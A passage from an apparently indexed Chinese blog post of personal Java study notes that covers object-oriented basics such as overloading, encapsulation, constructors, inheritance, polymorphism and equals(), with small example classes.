1; stus[i].state = (int)(Math.random() * (6-1+1)+1); stus[i].score = (int)(Math.random() * (100-0+1)); } // 实例化类对象 StudentsTest testStu = new StudentsTest(); //输出指定年级的学生 testStu.searchState(stus, 3); // 冒泡从小到大排序学生成绩 testStu.BubbleSort(stus); System.out.println(\"----------------排序完成---------------\"); // 遍历输出显示学生信息(排序之后的) testStu.printStutent(stus); } /** 遍历student数组操作的方法 * @param stus */ public void printStutent(Students[] stus) { for (int i = 0; i \u003c stus.length; i++) { System.out.println(stus[i].info()); } } /** 找指定年级的学生的方法 * * @author XPS * @param stus 要查找的数组 * @param sta 要找的年级 */ public void searchState(Students[] stus, int sta) { for (int i = 0; i \u003c stus.length; i++) { if(stus[i].state == sta) { System.out.println(sta + \"年级学生：\" + stus[i].info()); } } } /** * 给Students数组冒泡排序的方法 * @param stu */ public void BubbleSort(Students[] stu) { for (int i = 0; i \u003c stu.length-1; i++) { for (int j = 0; j \u003c stu.length-1-i; j++) { if(stu[j].score \u003e stu[j+1].score) { //交换的是Student对象的顺序 Students temp = stu[j]; stu[j] = stu[j+1]; stu[j+1] = temp; } } } } } class Students{ int num; // 学号 int state; // 年级 int score; //成绩 //显示学生信息的方法 public String info() { return \"学号：\" + num + \"，年级\" + state + \"，成绩：\" + score; } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:1","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"匿名对象 package cn.xpshuai.testc; public class InstanceTest { public static void main(String[] args) { Phone p1 = new Phone(); System.out.println(p1); p1.sendEmail(); // 匿名对象（new的对象没有赋值给变量名） --\u003e只能调用一次 new Phone().sendEmail(); // 没有吧实例化的对象赋值给变量，可以直接调用方法 new Phone().price = 1999; new Phone().showPrice(); // 新new的对象，是另外一个了，不能用第二次了 PhoneMall mall = new PhoneMall(); mall.show(new Phone()); // 这种情况下使用匿名对象较多 } } class Phone{ double price; public void sendEmail() { System.out.println(\"发邮件\"); } public void playGame() { System.out.println(\"打游戏\"); } public void showPrice() { System.out.println(\"价格为：\" + price); } } class PhoneMall{ public void show(Phone p) { p.sendEmail(); p.playGame(); } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:2","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"方法的重载(overload) 区分与后面的重写 **重载：**在同一个类中，允许存在—个以上的同名方法，只要它们的参数个数或参数类型不同即可。 **特点：**与返回值类型无关，只看参数列表，且参数列表必须不同(参数个数或参数类型)。调用时，根据方法参数列表的不同来区别。 如下两个同名方法构成了重载： public class{ //如下两个同名方法构成了重载 //反转数组（形参是整数数组） public void reverseArr(int[] arr) { for (int i = 0; i \u003c arr.length; i++) { int tmp = arr[i]; arr[i] = arr[arr.length-i-1]; arr[arr.length-i-1] = tmp; } } //反转数组(形参是字符数组) public void reverseArr(String[] arr) { for (int i = 0; i \u003c arr.length; i++) { String tmp = arr[i]; arr[i] = arr[arr.length-i-1]; arr[arr.length-i-1] = tmp; } } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:3","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"可变个数的形参（新特性） jdk5.0新增的内容 格式：func(数据类型 … 参数名) 当调用可变个数形参方法时，传入参数个数可为 0到多个 可变个数形参的方法与本类中方法名相同，形参不同的方法之间构成重载 可变个数形参在方法的形参中，必须声明在末尾（形参列表的最后一个位置） 可变个数形参在方法的形参中,最多只能声明一个可变形参。 /* * 使用场景：sql查询数据时候，where后面的条件中不知道写几个的时候 * */ public class ArgumentsTest { public static void main(String[] args) { ArgumentsTest a = new ArgumentsTest(); a.show(11); a.show(\"hello\"); a.show(\"hello\", \"world\"); a.show(new String[] {\"AAA\", \"BBB\", \"CCC\"}); } public void show(int i){ } public void show(String s){ } // 新特性：可变个数形参(都能识别) public void show(String ... strs){ for (int i = 0; i \u003c strs.length; i++) { System.out.println(strs[i]); //调用方法一样 } } // // 在jdk5.0之前，都是用数组来传递多个参数，和上面的是不可共存的(不构成重载) // public void show(String []... strs){ // // } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:4","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"方法参数的值传递机制 关于变量的赋值： 如果变量是基本数据类型：此时赋值的是变量所保存的数据值 如果变量是引用数据类型：此时赋值的是变量所指向的地址 方法形参的传递机制：【值传递机制】 如果参数是基本数据类型，此时实参赋给形参的是实参真实存储的数据值。 如果参数是引用数据类型，此时实参赋给形参的是实参存储数据的地址值。 public class ValueTranslation { public static void main(String[] args) { System.out.println(\"*********基本数据类型**********\"); int m = 10; int n = m; System.out.println(m + \"\\t\" + n); n = 20; System.out.println(m + \"\\t\" + n); // n变了之后，m是不变的 System.out.println(\"*********引用数据类型**********\"); Order o1 = new Order(); o1.id =1001; Order o2 = o1; System.out.println(o1.id + \"\\t\" + o2.id); // 1002 o2.id =1002; System.out.println(o1.id + \"\\t\" + o2.id); // o1也为1002（两个地址值相同，指向堆空间中同一个区域） System.out.println(\"*********方法形参的值传递**********\"); // 交换两个变量的值 int i = 10; int j = 20; System.out.println(i + \"\\t\" + j); // 交换两个变量的值的操作 ValueTranslation test = new ValueTranslation(); test.swap1(i, j); //调用方法，没换成（是基本数据类型，传递的参数的值，只是在swap作用域里面发生了交换） System.out.println(i + \"\\t\" + j); System.out.println(\"*********方法形参的引用数据类型传递**********\"); Data data = new Data(); data.x = 10; data.y = 20; System.out.println(data.x + \"\\t\" + data.y); ValueTranslation test2 = new ValueTranslation(); test2.swap2(data); //调用方法，换成了（是引用数据类型，交换的是堆空间的地址值） System.out.println(data.x + \"\\t\" + data.y); } public void swap1(int i, int j) { int tmp = i; i = j; j = tmp; } // 引用传递类型 public void swap2(Data data) { int tmp = data.x; data.x = data.y; data.y = tmp; } } class Order{ int id; } class Data{ int x; int y; } 但是，String作为引用数据类型，是例外的，是不能交换成功的，因为它存在字符串常量池中，会新造一个地址。所以，记下面这个结论： 如果变量是基本数据类型：此时赋值的是变量所保存的数据值 如果变量是引用数据类型：此时赋值的是变量所指向的地址 自定义封装Arrayutil类： package cn.xpshuai.testc; /* * 自定义封装数组的工具类 */ public class ArayUtil { //求数组最大值 public int getMax(int[] arr) { int max = 0; for (int i = 0; i \u003c arr.length; i++) { if (arr[i] \u003e max) { max = arr[i]; } } return max; } //求数组最小值 public int getMin(int[] arr) { int min = 0; for (int i = 0; i \u003c arr.length; i++) { if (arr[i] \u003c min) { min = arr[i]; } } return min; } //求数组总和 public int getSum(int[] arr) { int sum = 0; for (int i = 0; i \u003c arr.length; i++) { sum += arr[i]; } return sum; } //求数组平均值 public int getMiddle(int[] arr) { return getSum(arr) / arr.length; // 方法中调用方法 } //如下两个同名方法构成了重载（调用哪个取决你参数的类型） //反转数组 public void reverseArr(int[] arr) { for (int i = 0; i \u003c arr.length; i++) { int tmp = arr[i]; arr[i] = arr[arr.length-i-1]; arr[arr.length-i-1] = tmp; } } //反转数组 public void reverseArr(String[] arr) { for (int i = 0; i \u003c arr.length; i++) { String tmp = arr[i]; arr[i] = arr[arr.length-i-1]; arr[arr.length-i-1] = tmp; } } //复制数组(区别于数组变量的赋值：arr1=arr) public int[] copyArr(int[] arr) { int[] arr2 = new int[arr.length]; for (int i = 0; i \u003c arr2.length; i++) { arr2[i] = arr[i]; } return arr2; } // 数组遍历 public void printArr(int[] arr) { System.out.print(\"{\"); for (int i = 0; i \u003c arr.length; i++) { System.out.print(arr[i] + \", \"); } System.out.print(\"}\"); } // 数组排序(冒泡为例), 不用return public void sortArr(int[] arr) { for (int i = 0; i \u003c arr.length-1; i++) { for (int j = 0; j \u003c arr.length-1-i; j++) { if(arr[j] \u003e arr[j+1]) { //交换的是Student对象的顺序 // int temp = arr[j]; // arr[j] = arr[j+1]; // arr[j+1] = temp; // 错误的。不能传递基本数据类型 // swap(arr[j], arr[j+1]); // 正确的 swap(arr, j, j+1); } } } } public void swap(int[] arr, int i, int j) { int tmp = arr[i]; arr[i] = arr[j]; arr[j] = tmp; } //查找指定元素(这里 线性查找) public int getIndex(int[] arr, int dest){ for (int i = 0; i \u003c arr.length; i++) { if(arr[i] == dest) { return 1; // 返回索引值 } } return -1; //返回-1表示没找到 } /// ... } 画内存图 1.内存结构： ​ 栈（局部变量） 堆（new出来的结构：对象、数组） 2.变量：成员变量\u0026局部变量（方法内、方法形参、构造器内、构造器形参、代码块内） ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:5","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"封装性 隐藏对象内部的复杂性，只对外公开简单的接口。便于外界调用，从而提高系统的可扩展性、可维护性。通俗的说，把该隐藏的隐藏起来，该暴露的暴露出来。这就是封装性的设计思想。 封装性与隐藏： 在对对象发属性进行赋值时，赋值操作要受到数据类型和存储范围的制约。除此之外没有其他制约条件。但是，在实际问题中，我们往往需要给属性赋值 *加入额外的限制条件，这个条件就不能再属性声明时候体现，我们只能通过方法进行限制条件的添加。 * 同时我们需要避免用户再使用\"对象.属性\"方式进行赋值，则需要将属性声明为private * --\u003e此时针对属性，就体现了封装性 封装性体现： 1.我们将类的属性私有化(private),同时，提供公共的(public)方法来获取(getXXX)和设置(setXXX)此属性的值 2.不对外暴露私有方法 3.单例模式 4. ... ... 权限修饰符： * 封装性的体现需要权限修饰符来配合： * 1.java规定的四种权限(从小到大排序)：private、缺省(即default，不用写的时候)、protected、public * 详细见笔记 * 2.四种权限可以用来修饰类及类的内部结构：属性、方法、构造器、内部类 * 3.具体的，四种权限都可以用来修饰内部结构：属性、方法、构造器、内部类 * 修饰类的话：只能用public 和 缺省 封装性总结： Java提供了4种权限修饰符来修饰类及类的内部结构，体现类及类的内部结构在被调用时的可见性的大小。 public class AnimalTest { public static void main(String[] args) { Animal a = new Animal(); //a.name = \"大黄\"; //a.age = 2; //a.legs = 4; //禁止用户直接访问属性(权限修饰符 private)，让他访问setLegs() //a.legs = -4; // 负数肯定是不符合实际的，应该加限制只让输入正偶数 a.setName(\"大黄\"); a.setAge(2); a.setLegs(6); a.show(); // 测试权限 OrderTest o1 = new OrderTest(); o1.b = 111; o1.c = 222; // o1.a 调不了了(出了类，私有属性和方法就不能被调用) o1.test2(); o1.test3(); // o1.test1(); 调不了 } } class Animal{ private String name; private int age; private int legs; //腿个数, 私有的，禁止暴露在外面 //对属性的设置 // set, 把处理逻辑卸载里面封装起来 public void setLegs(int l) { if(l \u003e= 0 \u0026\u0026 l % 2 == 0) { legs = l; }else { legs = 0; } } //对属性的获取：get方法, 返回属性值 public int getLegs() { return legs; } public void setAge(int a){ if(a \u003e= 0) { age = a; }else { age = 0; } } public int getAge() { return age; } public void setName(String n){ name = n; } public String getName() { return name; } public void eat() { System.out.println(\"动物进食\"); } public void show() { System.out.println(\"动物的名字\" + name + \"，年龄：\" + age + \"，腿个数：\" + legs); } } 权限测试例子： public class OrderTest2 { // 不同包下，可以起同名的类 public static void main(String[] args) { // 测试权限 // 出了Order类所属的包之后，私有、缺省的结构都不可以调用了 OrderTest o1 = new OrderTest(); //o1.b = 111; // 缺省的也调用不了了 o1.c = 222; // o1.a 调不了了(出了类，私有属性和方法就不能被调用) //o1.test2(); o1.test3(); // o1.test1(); 调不了 } } ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:6","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"构造器 特征： 它具有与类相同的名称 它不声明返回值类型(与声明为void不同) 不能被static、final、synchronized、abstract、native修饰，不能有return语句返回值 **作用：**创建对象，初始化对象的属性 注意： 如果没有显式的定义类构造器的话，则系统默认提供一个空参的构造器 定义构造器的格式：权限修饰符 类名(形参列表){} 构造器 不是方法 一个类中定义多个构造器构成重载 一旦显式的定义类的构造器，系统就不再提供默认的空参构造器 一个类中，至少会有一个构造器 如下： public class PeopleTest { public static void main(String[] args) { // 创建类对象 People p = new People(\"Tom\", 18); //形参在创建对象时候就赋值了属性 p.walk(); } } class People{ String name; int age; // 构造器 public People(){ System.out.println(\"构造器1被调用...\"); } // 构造器的重载 public People(String n){ System.out.println(\"构造器1被调用...\"); name = n; //形参在创建对象时候就赋值了属性 } public People(String n, int a){ System.out.println(\"构造器1被调用...\"); name = n; //形参在创建对象时候就赋值了属性 age = a; } public void walk() { System.out.println(\"人走路...\"); } } 总结-属性赋值过程(按优先顺序)： 默认初始化 显式初始化 构造器中初始化 通过对象.属性或对象.方法的方式赋值 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:7","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"JavaBean JavaBean：是一种Java语言写成的可重用组件。 所谓javaBean，是指符合如下标准的Java类: 类是公共(public)的 有一个无参的公共的构造器 有属性，且有对应的getXXX、setXXX方法 满足这样三个条件的一个类，就叫JavaBean 也可以通过反射来造对象 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:8","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"UML类图 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:9","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"this关键字 this表示当前对象，可以调用类的属性、方法和构造器 它在方法内部使用，即这个方法所属对象的引用 它在构造器内部使用，表示该构造器正在初始化的对象 package cn.xpshuai.www; /* * this关键字 * * this修饰属性和方法 * this理解为：当前对象 或 当前正在创建的对象(构造器中) * * 【在类的方法中】，我们可以使用\"this.属性\"或\"this.方法\"的方式，调用当前对象属性或方法。但是,通常情况下,我们都选择省略\"this.\"。 * 特殊情况下，如果方法的形参和类的属性同名时，我们必须显式使用\"this.变量\"的方式，来表名次变量是属性而非形参 * 同样，【在构造器中】，我们可以使用\"this.属性\"或\"this.方法\"的方式，调用当前正在创建的对象属性或方法。但是,通常情况下,我们都选择省略\"this.\"。I * 特殊情况下，如果方法的形参和类的属性同名时，我们必须显式使用\"this.变量\"的方式，来表名次变量是属性而非形参 * * * * 【this调用构造器】 * 1.我们在类的构造器中，可以使用显式的使用\"this(形参列表);\"方式，调用本类中其他的构造器 * 2.构造器中不能使用\"this(形参列表);\"方式调用自己 * 3.如果一个类中有n和构造器，则最多有n-1个构造器中使用了\"this(形参列表);\" * 4.\"this(形参列表);\"必须声明在当前构造器的首行 * 5.构造器内部不能同时调用两个\"this(形参列表);\" * */ public class ThisTEst { public static void main(String[] args) { People2 p1 = new People2(\"Tom\", 12); System.out.println(p1.getAge()); } } class People2{ String name; int age; // 构造器（如果写下面的带参数的构造器，必须先写上空的构造器） public People2(){ System.out.println(\"构造器1被调用...\"); this.eat(); // 使用this调用方法 } public People2(String name){ this(); //调用上面的构造器1 System.out.println(\"构造器2被调用...\"); this.name = name; } public People2(String name, int age){ this(name); //调用上面的构造器2，方式冗余 // this.name = name; // 那么下面就不需要这行的name了 this.age = age; System.out.println(\"构造器3被调用...\"); } //set public void setName(String name) { this.name = name; //使用this(当前对象)区分：当前对象的name=name } //get public String getName() { return this.name; } public void setAge(int age) { this.age = age; } public int getAge() { return this.age; } public void walk() { System.out.println(\"人走路...\"); } } Eclipse快速生成get和set等方法：alt + seift +s快捷键就可以看到啦 Eclipse快速生成get和set等方法：alt +insert 快捷键就可以看到啦 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:10","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"package * package关键字的使用： * 1.为了实现更好项目中类的管理，提出了“包”的概念 * 2.使用package声明类或者接口所属的包，声明在源文件的首行 * 3.包，属于标识符，遵循标识符命名规范(小写)、见名知意 * 4.每\".\"一次，就代表一层文件目录 * * 补充：同一个包下，不能命名同名的接口、类, 不同包下可以命名同名的接口、类 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:11","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"继承性 Java只支持单继承和多层继承，不允许多重继承 Object类是所有类的根父类 简单例子如下： 测试类： package cn.xpshuai.java; /* * 继承好处： * 1.减少代码冗余，提高代码复用 * 2.便于功能拓展 * 3.为了以后多态使用，提供了前提 * * 格式： class A extends B{} * A:子类、派生类、subclass * B：父类、超类、基类、superclass * * 体现：一旦子类A继承父类B以后，子类A中就获取了父类B中声明的所有的 属性、方法 * 特别的，父类中声明为私有的属性和方法，子类仍获取到了，只是由于封装性影响--\u003e使得子类不能直接调用而已 * * 子类继承父类以后，还可以声明自己特有的属性或方法:实现功能的拓展。 * * * * 规定： * 1.一个类只能有一个父类 * 2.Java只支持单继承和多层继承 * 3.直接父类、间接父类。子类继承父类以后，就获取了直接父类以及所有间接父类中声明的属性和方法 * * * 如果我们没有显式的声明一个类的父类的话，则此类继承于java.lang.Object类 * 所有的Java类，都直接或间接的继承Object类 */ public class ExtendsTest { public static void main(String[] args) { Person p1 = new Person(\"张三\", 18); p1.eat(); Student s1 = new Student(\"GIS\"); s1.setName(\"张三三\"); s1.setAge(22); // 父类中的方法，子类中也可以调用 来实现复用 s1.show(); // System.out.println(s1.getMajor()); } } 父类： package cn.xpshuai.java; public class Person { private String name; //私有的也继承到了，通过getXXX方法来获取 private int age; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public void eat() { System.out.println(\"吃\"); } public void sleep() { System.out.println(\"睡觉\"); } } 子类： public class Student extends Person{ // extends Person ：表示继承Person类 private String major; //构造方法 public Student() { super(); } public Student(String major) { super(); this.major = major; } // get public String getMajor() { return major; } // set public void setMajor(String major) { this.major = major; } public void study() { System.out.println(\"学习\"); } public void show() { System.out.println(\"姓名：\" + getName() + \", 年龄：\" + getAge() + \"，专业：\" + getMajor()); } //重写父类方法 @Override public void eat() { System.out.println(\"学生应该多吃\"); } } 方法的重写(override 、 overwrite) 与前面的\"重载\"区分 **定义：**在子类中可以根据需要对从父类中继承来的方法进行改造，也称为方法的重置、覆盖。在程序执行时，子类的方法将覆盖父类的方法（子类根据需要对从父类继承来的方法进行改造）。 要求： 子类重写的方法必须和父类被重写的方法具有相同的方法名称、参数列表 子类重写的方法的返回值类型不能大于父类被重写的方法的返回值类型 子类重写的方法使用的访问权限不能小于父类被重写的方法的访问权限 子类不能重写父类中声明为private权限的方法 子类方法抛出的异常不能大于父类被重写方法的异常 注意： 子类与父类中同名同参数的方法必须同时声明为非static的(即为重写) 若同时声明为static的〈不叫重写），因为static方法是属于类的，子类无法覆盖父类的方法。 * 【重写】override 、 overwrite * 子类根据需要对从父类继承来的方法进行改造 * * 形式：权限修饰符 (可选：static/final) 返回值类型 方法名(形参列表) throws 异常的类型{ * //方法体 * } * * 1.必须与父类被重写的方法具有“相同的方法名称、参数列表” * 2.子类重写的方法的返回值类型“不能大于”父类被重写的方法的返回值 * \u003e父类被重写的方法的返回值类型是void，则子类重写的方法的返回值类型只能是void * \u003e父类被重写的方法的返回值类型是A类型，则子类重写的方法的返回值类型可以是A类或A类的子类 * \u003e父类被重写的方法的返回值类型是基:本据类型，则子类重写的方法的返回值类型必须是相同的基本数据类型 * 3.子类重写的方法使用的当问权限“不能小于”父类被重写的方法的访问权限 * \u003e子类不能重写父类中private的方法 * 4.子类方法抛出的异常不能大于父类被重写方法的异常 * \u003e * * 子类与父类中同名同参数的方法必须同时声明为非static的(即为重写)，或者同时声明为static的（不是重写）。因为static方法是属于类的，子类无法覆盖父类的方法。 * super关键字 子类重写了父类的方法之后，可以用super调用父类中的方法 super可以调用：属性、方法、构造器 super调用属性和方法： 我们可以在子类的方法或构造器中。通过使用super.属性或super.方法的方式，显式的调用父类中声明的属性或方法。但是，通常情况下，我们习惯省略super. 特殊情况: 当子类和父类中定义了同名的属性时，我们要想在子类中调用父类中声明的属性，则必须显式的使用super.属性的方式，表明调用的是父类中声明的属性。 特殊情况: 当子类重写了父类中的方法以后，我们想在子类的方法中调用父类中被重写的方法时，则必须显式的使用super.方法的方式，表明调用的是父类中被重写的方法。 super调用父类构造器： 我们可以在子类的构造器中显式的使用super(形参列表)的方式，调用父类中声明的指定的构造器 super(形参列表)的使用，必须声明在子类构造器的首行! 我们在类的构造器中，针对于this(形参列表)或super(形参列表)只能二选一，不能同时出现 在构造器的首行，没有显式的声明this(形参列表)或super(形参列表)，则默认调用的是父类中空参的构造方法 在类的多个构造器中，至少有一个类的构造器中使用了super(形参列表)，调用父类中的构造器 子类对象实例化的全过程： 1．从结果上来看:(继承性) * 子类继承父类以后，就获取了父类中声明的属性或方法。 * 创建子类的对象，在堆空间中，就会加载所有父类中声明的属性。 2．从过程上来看; * 当我们通过子类的构造器创建子类对象时，我们一定会直接或间接的调用其父类的构造器，进而调用父类的父类的构造器,直到调用了java.lang.0bject类中空参的构造器为止。正因为加载过所有的父类的结构，所以才可以看到内存中有父类中的结构，子类对象才可以考虑进行调用。 * 明确:虽然创建子类对象时，调用了父类的构造器，但是自始至终就创建过一个对象，即为new的子类对象。 如子类： public class Student extends Person{ // extends Person 继承Person类 private String major; private int id = 1002; //学号 //构造方法 public Student() { super(); } public Student(String name, int age, String major) { super(name, age); // super调用父类构造器 this.major = major; } public int getId() { return id; } public void setId(int id) { this.id = id; } public Student(String major) { super(); this.major = major; } // get public String getMajor() { return major; } // set ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:12","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"多态性(Polymorphism) **对象的多态性：**父类的引用指向子类的对象（可以直接应用在抽象类和接口上） Java引用变量有两个类型： 编译时类型：由声明该变量时候使用的类型决定 运行时类型：由实际赋给该变量的对象决定 简称：编译看左，运行看右 虚拟方法 问：多态是编译时行为还是运行时行为？ 答：运行时行为 instanceof操作符 x instanceof A：检验x是否为类A的对象，返回值为boolean类型 要求x所属的类与类A必须是子类和父类的关系，否则编译错误 如果x属于类A的子类B(间接父类子类关系)，也可以使用 instanceof情景：为了避免在向下转型时出现ClassCastException的异常，我们在向下转型之前，先进行instanceof判断 toString() 输出样式，可以手动重写子类中的该方法 ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:13","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"finalize() 对象回收之前会调用这个方法：finalize()， 子类可重写 //子类中 class B{ @Override protecred void finalize() throws Throwable{ System.out.println(\"对象被释放--\u003e \" = this); } ... } //强制性释放空间 System.gc(); ","date":"2021-01-15","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/:0:14","tags":["Java","面向对象","OOP","学习笔记"],"title":"Java学习之面向对象初识","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%88%9D%E8%AF%86/"},{"categories":["Java学习"],"content":"== 与 equals() import java.sql.Date; /* * * == 与equals() * * * 面试题： == 与equals() 区别？ * 【== 运算符】 1.可以使用在基本数据类型变量和引用数据类型变量中 2.如果比较的是基本数据类型变量:比较两个变量保存的数据是否相等(不一定类型要相同) 如果比较的是引用数据类型变量，比较两个对象的地址值是否相同.即两个引用是否指向同一个对象实体 【equals()方法】 是一个方法，而非运算符 只能用于引用数据类型 像String、 Date、File、包装类等都重写了0bject类中的equals()方法。重写以后，比较的不是两个引用的地址是否相同，而是比较两个对象的T体内容是否相同。 【重写Object类中的equals()】 通常情况下，我们自定义的类如果使用equals()的话，也通常是比较两个对象的\"实体内容\"是否相同。那么，我们就需要对Object类中的equals()进行重写 重写的原则：比较两个对象的实体内容是否相同. * */ public class EqualsTest { public static void main(String[] args) { int i = 10; char c = 10; System.out.println( c == i); // true char c1 = 'A'; // ascii码也为65 char c2 = 65; System.out.println(c1 == c2); //true Customer customer1 = new Customer(\"xxx\"); Customer customer2 = new Customer(\"xxx\"); System.out.println(customer1 == customer2); // false // String也是引用型数据 String s1 = new String(\"asd\"); String s2 = new String(\"asd\"); System.out.println(s1 == s2); // false System.out.println(s1.equals(s2)); // true 调用的是String中的equals()，和==作用是相同的 System.out.println(customer1.equals(customer2)); // false 调用的是Object中的equals, 自定义之后变为true了 Date date1 = new Date(2354534654L); Date date2 = new Date(2354534654L); System.out.println(date1.equals(date2)); //true } } class Customer{ String name; int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public Customer() { } public Customer(String name) { this.name = name; } public Customer(String name, int age) { this.name = name; this.age = age; } //自己手动重写Object类中的equals() // 重写原则： // @Override // public boolean equals(Object obj) { // System.out.println(\"Customer的equals()...\"); // if(this == obj) { // return true; // } // if(obj instanceof Customer) { // Customer cust = (Customer)obj; //强转 // //比较两个对象的每个属性是否都相同 // return this.age == cust.age \u0026\u0026 this.name.equals(cust.name); // }else { // return false; // } // } //自动重写的 @Override public boolean equals(Object obj) { if (this == obj) return true; if (obj == null) return false; if (getClass() != obj.getClass()) return false; Customer other = (Customer) obj; if (age != other.age) return false; if (name == null) { if (other.name != null) return false; } else if (!name.equals(other.name)) return false; return true; } } 重写equals()方法的原则： 